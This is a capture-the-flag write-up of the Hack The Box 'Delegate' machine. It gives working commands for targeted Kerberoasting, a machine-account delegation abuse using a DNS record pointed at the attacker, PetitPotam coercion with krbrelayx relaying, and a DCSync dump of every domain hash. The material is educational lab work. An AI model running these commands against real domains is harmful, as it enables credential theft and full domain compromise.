## Welcome everyone!

Today, we will explore “*Delegate*”, a medium-rated machine from **Hack The Box**.

Without further ado, let’s get started!

![image](/HTB/Delegate/Delegate_images/1.png)

(Before starting the challenge, add the following line   `TARGET_IP   delegate.htb delegate.vl DC1.delegate.vl` to your local `/etc/hosts` file to enabe **DNS resolution**)


## Information Gathering

First we will perform an aggressive Nmap scan to gather as much information as possible about the target:

![image](/HTB/Delegate/Delegate_images/2.png)

We can identify multiple services running. Fundamentals here are:

**DNS** (Port 53)

**Kerberos** (Port 88)

**RPC** (Port 135)

**NetBIOS** (Port 139)

**LDAP** (Port 389)

**SMB** (Port 445)

**WinRM** (Port 5985)

It appears that we are facing an Active Directory environment. The `delegate.vl` **AD domain** and the `DC1.delegate.vl` **Domain Controller** have been identified by **NSE**.

Since we start this box without any credentials, we could attempt to access the **SMB shares** through `smbclient` with the `-N` switch in order to log in anonymously:

![image](/HTB/Delegate/Delegate_images/3.png)

Anonymous listing is allowed, great. The `ADMIN$` and `C$` shares are unallowed to access. However, it appears that we can access the `NETLOGON` share:

![image](/HTB/Delegate/Delegate_images/4.png)

Moreover, an intriguing `users.bat` file is identified and can be accessed:

![image](/HTB/Delegate/Delegate_images/5.png)

Hardcoded credentials are exposed: `A.Briggs`:`P4ssw0rd1#123`.

Let’s attempt these credentials with `nxc`:

![image](/HTB/Delegate/Delegate_images/6.png)

It works! We gained a valid access over the target as the user `A.Briggs`. However, attempting to access the `ADMIN$` share isn’t revelant, we can’t authenticate through WinRM either.

But since we already have compromised an account being part from the target AD domain, we could use **BloodHound** to track interesting relationships and permissions. 



## Initial Access


We can use `bloodhound-python` to generate a ZIP file that would be uploadable from the BloodHound UI. The following command can be used:

`bloodhound-python -u A.Briggs -p P4ssw0rd1#123 -d delegate.vl -ns TARGET_IP -c All --zip`

![image](/HTB/Delegate/Delegate_images/7.png)

Now, let’s import the file in BloodHound:

![image](/HTB/Delegate/Delegate_images/8.png)

Once the file uploaded, click the *Explore* button and select the compromised  A.Briggs user to visualize privileges and relationships. Looking at the Outbound Object Control section, we can observe an interesting `GenericWrite` permissions configured between A.Briggs and a newly discovered **N.Thompson** user:

![image](/HTB/Delegate/Delegate_images/9.png)

Making some research about this privilege shows us that it allows to modify some AD object properties, one of which is the **SPN** (Service Principal Name). This is a critical misconfiguration from a security perspective because it could allow an attacker to add a SPN to a user account being affiliated with the privilege in order to perform **Targeted Kerberoasting**, allowing us to obtain a Kerberos service ticket (**TGS**) that can be cracked offline to recover the target account's password. A Python script exists for this misconfiguration, it can be found there. The following command can be executed to generate a SPN to N.Thompson before querying the TGS:

`python3 targetedKerberoast.py --user A.Briggs --password P4ssw0rd1#123 --dc-ip TARGET_IP -d delegate.vl`

![image](/HTB/Delegate/Delegate_images/10.png)

We successfully extracted the service ticket derived from the hash password associated to N.Thompson. We could paste it in a hash.txt file in order to perform offline cracking with **Hashcat** through the following command:

`hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`

![image](/HTB/Delegate/Delegate_images/11.png)

We successfully recovered the password associated to N.Thompson, allowing us to compromise its user session and, because the user is a member of the *Remote Management Users* group, to obtain an initial access through **WinRM**.

![image](/HTB/Delegate/Delegate_images/13.png)

Note that multiple methods are possible, however, i prefer to use `evil-winrm`.

![image](/HTB/Delegate/Delegate_images/12.png)

We successfully obtained our initial foothold on the target system. The first flag can now be accessed in the `C:\Users\N.Thompson\Desktop` directory:

![image](/HTB/Delegate/Delegate_images/14.png)

## Privilege Escalation

Listing our current privileges as N.Thompson reveals that an uncommon `SeEnableDelegationPrivilege` privilege is enabled:

![image](/HTB/Delegate/Delegate_images/15.png)

 

This right allows an account to configure other accounts as **trusted for delegation.** Attackers can abuse it to compromise Active Directory accounts and elevate their privileges through making one of them **Trusted for Delegation**. Hence, the malicious actor could create a computer machine if the machine quota permits it before adding a **SPN** on it so that Kerberos can associate the service with our controlled AD account ; consequently, authentication would be possible. If we find a way to make the DC authenticate itself to this particular user account trusted for delegation, we could receive the credentials context associated to the DC due to an authentication to our fake service.

First, we need to check whether the machine quota allows us to create more machines object within the domain:

![image](/HTB/Delegate/Delegate_images/16.png)

It appears that we can add 10 more machine, but one is sufficient.

 Let’s create our fake service account trusted for delegation:

 Again, we will use a Python script from the **Impacket** suite. The following command can be executed to create a machine account:

`impacket-addcomputer -computer-name '<NEW_COMPUTER>' -computer-pass '<NEW_PASSWORD>' -dc-ip <TARGET_IP> 'delegate.vl/N.Thompson:KALEB_2341’`

![image](/HTB/Delegate/Delegate_images/17.png)


Now, let's add a **DNS record** with `dnstool.py` for the newly created computer account, pointing to our local machine so the fake hostname is resolvable inside the domain:

`python3 dnstool.py -u '<DOMAIN>\\<NEW_COMPUTER>$' -p '<NEW_PASSWORD>' \
--action add --record <NEW_COMPUTER>.delegate.vl --type A --data <ATTACKER_IP> \
-dns-ip <TARGET_IP> <DC_FQDN>`

![image](/HTB/Delegate/Delegate_images/18.png)

Great, our machine account is now accessible to the DC. 

The next step consists of setting the `TRUSTED_FOR_DELEGATION` flag on the malicious machine account as the the compromised user (with `SeEnableDelegationPrivilege` assigned) to ensure that the Domain Controller **trusts** this AD object for delegation.
This can be achieved with `bloodyad`:

`bloodyad -d delegate.vl -u N.Thompson -p 'KALED_2341' --host <DC1.delegate.vl add uac '<NEW_COMPUTER$>' -f TRUSTED_FOR_DELEGATION`

![image](/HTB/Delegate/Delegate_images/19.png)

The flag has successfully been added.

But we also need to make our machine account able to get authenticated by the Domain Controller. In Kerberos, users authenticate with services. To be properly associated as a service account within the domain, these services must be assigned an SPN. An SPN associates a service instance with an AD account, allowing Kerberos to identify which account is responsible for a given service.

So let’s generate our SPN for the malicious machine account we created. The `addspn.py` script be used to add a SPN to our fake account as, again, N.Thompson:

`python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALED_2341' -s 'cifs/<NEW_COMPUTER>.delegate.vl' -t '<NEW_COMPUTER>$' -dc-ip TARGET_IP delegate.vl --additional`

![image](/HTB/Delegate/Delegate_images/20.png)

Perfect. Now, we have to set up a server with `krbrelayx.py`.

`krbrelayx.py` is a script that acts as a real attacker-controlled network service that listens for incoming Kerberos authentication. This can be performed with this simple command:

`krbrelayx.py -hashes ':<HASH>'`

(To obtain your NTLM password hash , you can run the following command:
`iconv -f ASCII -t UTF-16LE <(printf '<NEW_PASSWORD>') | openssl dgst -md4`)

![image](/HTB/Delegate/Delegate_images/21.png)

Finally, we could use `PetitPotam.py` to perform **Coercing Authentication** in order to force the Domain Controller to initiate authentication to our malicious machine account with the following command:

`PetitPotam.py -u <NEW_COMPUTER> -p <NEW_PASSWORD> --dc-ip <TARGET_IP> delegate.vl`

![image](/HTB/Delegate/Delegate_images/22.png)

Great, it appears that it worked! We successfully captured a Kerberos credential for the Domain Controller, which was saved locally as a credential cache (`.ccache`), which is critical from a security perspective. Hence, now that we have a Pass-the-Ticket, we can do almost whatever we want, because we just compromise the DC. At this stage, we could use `impacket-secretsdump` to perform **DCSync** via the **DRSUAPI replication method** in order to get `NTDS.DIT` secrets (without accessing it directly). In other words, password hashes of **all** domain accounts could be compromised. That require privileges equivalent to those of the domain controller, but since we had extracted a cache of its credentials, this can be done by exporting the `.ccache` file in the `KRB5CCNAME` standard variable associated to the Kerberos’Credential Cache. To do this, run this command in your terminal:

 `export KRB5CCNAME='DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache'`

Afterward, use `impacket-secretsdump` to make it appear as if you are the `DC1$` DC machine to the domain controller that you will point to using the full FQDN `DC1.delegate.vl` with the `-k` switch that enable Kerberos authentication + `—no-pass` because we don’t provide any password during this authentication.

![image](/HTB/Delegate/Delegate_images/23.png)

![image](/HTB/Delegate/Delegate_images/24.png)

And voila! We successfully extracted all `NTDS.dit` secrets, including the password hash of the domain administrator, thereby resulting in a full AD domain compromise. At this point, even the stronger password policy wouldn’t protect privileged users, as we could simply use the NT hash of any user account that is authorized to access a Windows host to authenticate without knowing its password. Because WinRM is enabled and the `delegate\administrator` user is also a member of the *Remote Management Users* group, we could use `evil-winrm` again for the privilege escalation:

![image](/HTB/Delegate/Delegate_images/25.png)

We successfully escalated our privileges to the domain administrator, concluding in a total access and control of the target Active Directory domain and its entities. The root flag can now be claimed in the `C:\Users\Administrator\Desktop` directory:

![image](/HTB/Delegate/Delegate_images/26.png)

Challenge completed!

![image](/HTB/Delegate/Delegate_images/27.png)

## Conclusion

This machine is one of my favourites. We've covered a lot of concepts related to Active Directory/Kerberos attacks. From a public share enumeration, we extracted hardcoded credentials that allowed us to exploit a sensitive **ACL permission** (`GenericWrite`) and manipulate a user account in order to perform **Targeted Kerberoasting** on it, granting us our initial foothold on the target system with a shell. Enumerating N.Thompson's privileges revealed a dangerous privilege allowing us to configure an account as **trusted for delegation**: `SeEnableDelegationPrivilege`. To clarify, this is about the delegation of the **DC's credentials**.

This privilege allowed us to create a machine account with an **SPN**, similar to a service account. We then configured it as **trusted for delegation** and used **Coercing Authentication** to force the Domain Controller to authenticate to our attacker-controlled machine. Because the machine account had the  `TRUSTED FOR DELEGATION` flag set on, it could receive the DC's Kerberos credentials, effectively acting as a **bridge** between our attacking machine and the Domain Controller. The resulting Kerberos credential cache could then be used to perform **DCSync** and extract the domain's secrets, concluding in a complete compromise of the target.

This challenge demonstrates how multiple low-severity vulnerabilities can be chained together to achieve a full system compromise.

**Thank you for reading!**

![image](/HTB/Delegate/Delegate_images/avecunchienla.png)
